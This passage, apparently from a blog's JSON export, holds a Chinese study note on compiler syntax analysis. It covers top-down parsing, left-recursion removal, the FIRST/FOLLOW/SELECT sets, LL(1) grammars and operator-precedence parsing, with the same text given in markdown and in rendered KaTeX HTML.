相同左部的**规则**，其中某一个右部能够推出$\\epsilon$，在从开始符号$S$的某一个推导中，左部非终结字符的后继符号与其某一个规则的右部的左端相同。\n\n为了解决这些问题，定义了一些三个特殊集合。\n\n##### FIRST集合\n若$G$是一个不含左递归的文法，对$G$的任意一个符号串$\\alpha$，定义其$FIRST$集合。\n$$\nFIRST\\left(\\alpha\\right):=\\left\\{s|\\alpha\\stackrel{*}{\\Rightarrow}s\\dots \\land s \\in V_{T} \\right\\}\n$$\n若$\\alpha\\stackrel{*}{\\Rightarrow}\\epsilon$，规定$\\epsilon \\in FIRST\\left(\\alpha\\right)$。\n\n##### FOLLOW集合\n\n假设$S$是文法$G$的开始符号，对于$G$中任意非终结字符$A$，定义其$FOLLOW$集合。\n$$\nFOLLOW\\left(A\\right)=\\left\\{\\alpha|S\\stackrel{*}{\\Rightarrow}\\dots A\\alpha\\dots \\land \\alpha \\in V_{T}\\right\\}\n$$\n若$S\\stackrel{*}{\\Rightarrow}\\dots A$，规定$\\$ \\in FOLLOW\\left(A\\right)$。\n\n##### SELECT集合 \n\n对于文法中任意一条规则$A\\rightarrow \\alpha$，定义$SELECT$集合。\n$$\nSELECT\\left(A\\rightarrow \\alpha\\right)=\n\n\\begin{cases}\n\nFIRST\\left(\\alpha\\right)&\\text{if $\\alpha \\cancel{\\stackrel{*}{\\Rightarrow}} \\epsilon$}\\\\\n\n\\left(FIRST(\\alpha)-\\left\\{\\epsilon\\right\\}\\right)\\cup FOLLOW\\left(A\\right)&\\text{if $\\alpha {\\stackrel{*}{\\Rightarrow}} \\epsilon$}\n\n\\end{cases}\n$$\n\n#### LL(1)文法的条件\n\n当且仅当，文法中对每个非终结符$A$的任意两个不同的规则，其$SELECT$集合不**相交**。对于LL(1)文法，可以用自上而下的递归方法进行分析，且不存在回溯和死循环。\n\n### 自下而上分析法\n\n基本思想与方法：“移进-规约“，将输入串中的字符从左到右push到stack中，一边移进一边分析。**当栈顶符号形成某挑规则右部时**，进行一次**规约**，将相应的右部符号串替换成规则左部的非终结符。重复这个过程，直到输入串都被push到stack中，且stack中只剩下**右界符**$\\$$和文法的开始符号，则匹配成功。\n\n从语法树的角度去看，自下而上的方法是**从叶结点开始的**。\n\n#### 算符优先分析法\n\n算符优先分析法简单、直观，但对文法有较高的要求。\n\n##### 算符文法\n\n设有文法$G$，若$G$中不出现形如$U\\rightarrow \\dots VW \\dots$，其中$V$和$W$是非终结字符，则称$G$是**算符文法**。\n\n在算符文法中，任何一个规则右部都不存在两个相邻的非终结字符。它有两个性质：\n\n1. 在算符文法中任何句型都不含两个相邻的非终结字符。\n2. 若$Ab$或者$bA$出现在算符文法的句型$\\beta$中，$A$是非终结字符，$b$是终结字符，则$\\beta$中任何包含$b$的短语必定包含$A$。\n\n>回溯学习：\n>\n>假设$\\alpha \\beta \\delta$是文法$G$的一个句型，如果有\n>$$\n>S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A {\\stackrel{+}{\\Rightarrow}} \\beta\n>$$\n>则称$\\beta$是相对于非终结字符$A$的、句型$\\alpha \\beta \\delta$的一个短语。\n\n这两个性质很好证明。\n\n##### 任意两个非终结符之间的优先关系\n\n设$G$是一个算符文法，$a$和$b$是任意两个终结符，$P, Q,R$是非终结符，定义算符优先关系：（这里打不出带点的小于号、大于号和等于号，所以用常规的符号代替）\n$$\n\\begin{aligned}\n&a=b\\,当且仅当\\,G\\,中含有形如\\,P\\rightarrow\\dots ab\\dots\\,或P\\,\\rightarrow\\dots aQb \\dots\\,的规则\\\\\n&a<b\\,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots aR\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}b\\dots\\,或\\,R\\stackrel{+}{\\Rightarrow}Qb\\dots\\\\\n&a>b,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots Rb\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}\\dots a\\,或\\,R\\stackrel{+}{\\Rightarrow}\\dots aQ\n\\end{aligned}\n$$\n需要注意的是，终结符之间的算符优先关系与终结符的**出现顺序**是有关的。\n\n##### 算符优先文法\n\n设算符文法$G$不含$\\epsilon$规则，若对于任意两个终结符，它们的算符优先关系唯一，那$G$就是算符优先文法。\n\n### LR分析法","source":"_posts/语法分析知识点.md","raw":"---\ntitle: 语法分析知识点\ntop_img: false\ncover: /img/compiler.jpg\ndate: 2020-11-24 14:11:50\ntags:\n- 编译原理\nkatex: true\n---\n\n## 语法分析的方法\n\n### 自上而下分析法\n\n基本思想：对任何输入串，试图用一切可能的方法，从文法的开始符号出发，反复使用各种产生式，寻找匹配的推导。\n\n方法：反复把产生式的左部符号替换成右部，从数根开始构造语法树。**寻找一个最左推导**，而本质上是一个穷举过程。\n\n#### 例子 \n文法$G\\left[S\\right]$：\n$$\n\\begin{aligned}\nS &\\rightarrow aAb\t\\\\\nA &\\rightarrow de|d\n\\end{aligned}\n$$\n\n对于输入串$W=adb$，从左到右地匹配。\n1. 首先输入流指针指向第一个字符$a$，以开始结点$S$构造语法树，如下。（hexo显示mermaid还要装插件，懒得弄了）\n```mermaid\ngraph TB\n    S --- a\n    S --- A\n    S --- b\n```\n2. 此时最左子节点是终结字符$a$，与输入流指针指向的字符相同。因此该指针指向下一个字符$d$。\n3. 对于下一个结点$A$，它是一个非终结字符，它会产生两颗语法树。如图：\n\n```mermaid\ngraph TB\n    S --- a\n    S --- A\n    S --- b\n    A --- d\n    A --- e\n```\n\n```mermaid\ngraph TB\n    S --- a\n    S --- A\n    S --- b\n    A --- d\n```\n\n4. 先选择第一棵语法树，$d$和$d$匹配，输入流指针再次转移到下一个字符$b$。而$b$和语法树中的字符$e$不一致，匹配失败。\n5. 因为第一棵语法树失败了，因此要回溯，选择第二课语法树。输入流指针重新指向第二个字符$d$。\n6. 和之前一样，指针指向的字符$d$和语法树中的$d$匹配，指针指向下一个$b$。而$b$也和语法树中的第三个子节点$b$相匹配，此时语法树的子节点也被遍历完了，匹配成功。$W=adb$确实是文法的句子。\n\n#### 自上而下的问题\n自上而下本质上是最左推导的穷举方法，还带**回溯**，效率极低，因此在使用自上而下分析法的时候，需要对文法有一定的限制：**无左递归**和**无回溯**。\n\n#### 为什么需要消除左递归？\n显然，左递归会引起死循环。\n\n#### 左递归的消除\n\n如果文法中存在推导$A\\stackrel{+}{\\Rightarrow}A\\alpha$，则存在左递归。可以直接对左递归的规则进行等价变换。\n\n若存在非终结字符的直接左递归规则：\n$$\nA \\rightarrow A\\alpha|\\beta\n$$\n其中，$\\alpha$是任意符号串，而$\\beta$不以$A$开头，则可以写成等价右递归：\n$$\n\\begin{aligned}\n&A \\rightarrow \\beta A^{'}\\\\\n&A^{'} \\rightarrow \\alpha A^{'}|\\epsilon\n\\end{aligned}\n$$\n对于一般情况：\n$$\nA \\rightarrow A \\alpha_{1}|A \\alpha_{2}|\\dots|A \\alpha_{m}|\\beta_{1}|\\beta_{2}|\\dots|\\beta_{n}\n$$\n可以写成：\n$$\n\\begin{aligned}\n&A \\rightarrow \\beta_{1}A^{'}|\\beta_{2}A^{'}|\\dots|\\beta_{n}A^{'}\\\\\n&A^{'} \\rightarrow \\alpha_{1}A^{'}|\\alpha_{2}A^{'}|\\dots|\\alpha_{m}A^{'}|\\epsilon\n\\end{aligned}\n$$\n可以进一步写成：\n$$\n\\begin{aligned}\n&A \\rightarrow A^{''}A^{'}\\\\\n&A^{''}\\rightarrow \\beta_{1}|\\beta_{2}|\\dots|\\beta_{n} \\\\\n&A^{'} \\rightarrow A^{'''}A^{'}|\\epsilon \\\\\n&A^{'''} \\rightarrow \\alpha_{1}|\\alpha_{2}|\\dots|\\alpha_{m}\n\\end{aligned}\n$$\n\n#### 回溯消除\n\n为什么会产生回溯？因为在遇到非终结字符挑选候选式的时候，可能会有多个候选式符合要求。具体有两种情况：\n1. 相同左部的**规则**，产生式右部左端的第一个终结字符相同。\n2. 相同左部的**规则**，其中某一个右部能够推出$\\epsilon$，在从开始符号$S$的某一个推导中，左部非终结字符的后继符号与其某一个规则的右部的左端相同。\n\n为了解决这些问题，定义了一些三个特殊集合。\n\n##### FIRST集合\n若$G$是一个不含左递归的文法，对$G$的任意一个符号串$\\alpha$，定义其$FIRST$集合。\n$$\nFIRST\\left(\\alpha\\right):=\\left\\{s|\\alpha\\stackrel{*}{\\Rightarrow}s\\dots \\land s \\in V_{T} \\right\\}\n$$\n若$\\alpha\\stackrel{*}{\\Rightarrow}\\epsilon$，规定$\\epsilon \\in FIRST\\left(\\alpha\\right)$。\n\n##### FOLLOW集合\n\n假设$S$是文法$G$的开始符号，对于$G$中任意非终结字符$A$，定义其$FOLLOW$集合。\n$$\nFOLLOW\\left(A\\right)=\\left\\{\\alpha|S\\stackrel{*}{\\Rightarrow}\\dots A\\alpha\\dots \\land \\alpha \\in V_{T}\\right\\}\n$$\n若$S\\stackrel{*}{\\Rightarrow}\\dots A$，规定$\\$ \\in FOLLOW\\left(A\\right)$。\n\n##### SELECT集合 \n\n对于文法中任意一条规则$A\\rightarrow \\alpha$，定义$SELECT$集合。\n$$\nSELECT\\left(A\\rightarrow \\alpha\\right)=\n\n\\begin{cases}\n\nFIRST\\left(\\alpha\\right)&\\text{if $\\alpha \\cancel{\\stackrel{*}{\\Rightarrow}} \\epsilon$}\\\\\n\n\\left(FIRST(\\alpha)-\\left\\{\\epsilon\\right\\}\\right)\\cup FOLLOW\\left(A\\right)&\\text{if $\\alpha {\\stackrel{*}{\\Rightarrow}} \\epsilon$}\n\n\\end{cases}\n$$\n\n#### LL(1)文法的条件\n\n当且仅当，文法中对每个非终结符$A$的任意两个不同的规则，其$SELECT$集合不**相交**。对于LL(1)文法，可以用自上而下的递归方法进行分析，且不存在回溯和死循环。\n\n### 自下而上分析法\n\n基本思想与方法：“移进-规约“，将输入串中的字符从左到右push到stack中，一边移进一边分析。**当栈顶符号形成某挑规则右部时**，进行一次**规约**，将相应的右部符号串替换成规则左部的非终结符。重复这个过程，直到输入串都被push到stack中，且stack中只剩下**右界符**$\\$$和文法的开始符号，则匹配成功。\n\n从语法树的角度去看，自下而上的方法是**从叶结点开始的**。\n\n#### 算符优先分析法\n\n算符优先分析法简单、直观，但对文法有较高的要求。\n\n##### 算符文法\n\n设有文法$G$，若$G$中不出现形如$U\\rightarrow \\dots VW \\dots$，其中$V$和$W$是非终结字符，则称$G$是**算符文法**。\n\n在算符文法中，任何一个规则右部都不存在两个相邻的非终结字符。它有两个性质：\n\n1. 在算符文法中任何句型都不含两个相邻的非终结字符。\n2. 若$Ab$或者$bA$出现在算符文法的句型$\\beta$中，$A$是非终结字符，$b$是终结字符，则$\\beta$中任何包含$b$的短语必定包含$A$。\n\n>回溯学习：\n>\n>假设$\\alpha \\beta \\delta$是文法$G$的一个句型，如果有\n>$$\n>S{\\stackrel{*}{\\Rightarrow}}\\alpha A \\delta \\land A {\\stackrel{+}{\\Rightarrow}} \\beta\n>$$\n>则称$\\beta$是相对于非终结字符$A$的、句型$\\alpha \\beta \\delta$的一个短语。\n\n这两个性质很好证明。\n\n##### 任意两个非终结符之间的优先关系\n\n设$G$是一个算符文法，$a$和$b$是任意两个终结符，$P, Q,R$是非终结符，定义算符优先关系：（这里打不出带点的小于号、大于号和等于号，所以用常规的符号代替）\n$$\n\\begin{aligned}\n&a=b\\,当且仅当\\,G\\,中含有形如\\,P\\rightarrow\\dots ab\\dots\\,或P\\,\\rightarrow\\dots aQb \\dots\\,的规则\\\\\n&a<b\\,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots aR\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}b\\dots\\,或\\,R\\stackrel{+}{\\Rightarrow}Qb\\dots\\\\\n&a>b,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots Rb\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}\\dots a\\,或\\,R\\stackrel{+}{\\Rightarrow}\\dots aQ\n\\end{aligned}\n$$\n需要注意的是，终结符之间的算符优先关系与终结符的**出现顺序**是有关的。\n\n##### 算符优先文法\n\n设算符文法$G$不含$\\epsilon$规则，若对于任意两个终结符，它们的算符优先关系唯一，那$G$就是算符优先文法。\n\n### LR分析法","slug":"语法分析知识点","published":1,"updated":"2020-11-30T07:09:10.753Z","_id":"ckiszi5ap000n98waagz31h6d","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"语法分析的方法\"><a class=\"markdownIt-Anchor\" href=\"#语法分析的方法\"></a> 语法分析的方法</h2>\n<h3 id=\"自上而下分析法\"><a class=\"markdownIt-Anchor\" href=\"#自上而下分析法\"></a> 自上而下分析法</h3>\n<p>基本思想：对任何输入串，试图用一切可能的方法，从文法的开始符号出发，反复使用各种产生式，寻找匹配的推导。</p>\n<p>方法：反复把产生式的左部符号替换成右部，从数根开始构造语法树。<strong>寻找一个最左推导</strong>，而本质上是一个穷举过程。</p>\n<h4 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\"></a> 例子</h4>\n<p>文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>S</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>→</mo><mi>a</mi><mi>A</mi><mi>b</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>A</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>→</mo><mi>d</mi><mi>e</mi><mi mathvariant=\"normal\">∣</mi><mi>d</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\nS &amp;\\rightarrow aAb\t\\\\\nA &amp;\\rightarrow de|d\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.0000000000000004em;vertical-align:-1.2500000000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.7500000000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span><span style=\"top:-2.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2500000000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.7500000000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">b</span></span></span><span style=\"top:-2.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2500000000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>对于输入串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>W</mi><mo>=</mo><mi>a</mi><mi>d</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">W=adb</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">b</span></span></span></span>，从左到右地匹配。</p>\n<ol>\n<li>首先输入流指针指向第一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>，以开始结点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>构造语法树，如下。（hexo显示mermaid还要装插件，懒得弄了）</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TB</span><br><span class=\"line\">    S --- a</span><br><span class=\"line\">    S --- A</span><br><span class=\"line\">    S --- b</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>此时最左子节点是终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>，与输入流指针指向的字符相同。因此该指针指向下一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>。</li>\n<li>对于下一个结点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，它是一个非终结字符，它会产生两颗语法树。如图：</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TB</span><br><span class=\"line\">    S --- a</span><br><span class=\"line\">    S --- A</span><br><span class=\"line\">    S --- b</span><br><span class=\"line\">    A --- d</span><br><span class=\"line\">    A --- e</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TB</span><br><span class=\"line\">    S --- a</span><br><span class=\"line\">    S --- A</span><br><span class=\"line\">    S --- b</span><br><span class=\"line\">    A --- d</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>先选择第一棵语法树，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>匹配，输入流指针再次转移到下一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>。而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>和语法树中的字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding=\"application/x-tex\">e</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">e</span></span></span></span>不一致，匹配失败。</li>\n<li>因为第一棵语法树失败了，因此要回溯，选择第二课语法树。输入流指针重新指向第二个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>。</li>\n<li>和之前一样，指针指向的字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>和语法树中的<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>匹配，指针指向下一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>。而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>也和语法树中的第三个子节点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>相匹配，此时语法树的子节点也被遍历完了，匹配成功。<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>W</mi><mo>=</mo><mi>a</mi><mi>d</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">W=adb</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">b</span></span></span></span>确实是文法的句子。</li>\n</ol>\n<h4 id=\"自上而下的问题\"><a class=\"markdownIt-Anchor\" href=\"#自上而下的问题\"></a> 自上而下的问题</h4>\n<p>自上而下本质上是最左推导的穷举方法，还带<strong>回溯</strong>，效率极低，因此在使用自上而下分析法的时候，需要对文法有一定的限制：<strong>无左递归</strong>和<strong>无回溯</strong>。</p>\n<h4 id=\"为什么需要消除左递归\"><a class=\"markdownIt-Anchor\" href=\"#为什么需要消除左递归\"></a> 为什么需要消除左递归？</h4>\n<p>显然，左递归会引起死循环。</p>\n<h4 id=\"左递归的消除\"><a class=\"markdownIt-Anchor\" href=\"#左递归的消除\"></a> 左递归的消除</h4>\n<p>如果文法中存在推导<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>A</mi><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\stackrel{+}{\\Rightarrow}A\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.075201em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，则存在左递归。可以直接对左递归的规则进行等价变换。</p>\n<p>若存在非终结字符的直接左递归规则：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi>α</mi><mi mathvariant=\"normal\">∣</mi><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow A\\alpha|\\beta\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>是任意符号串，而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord 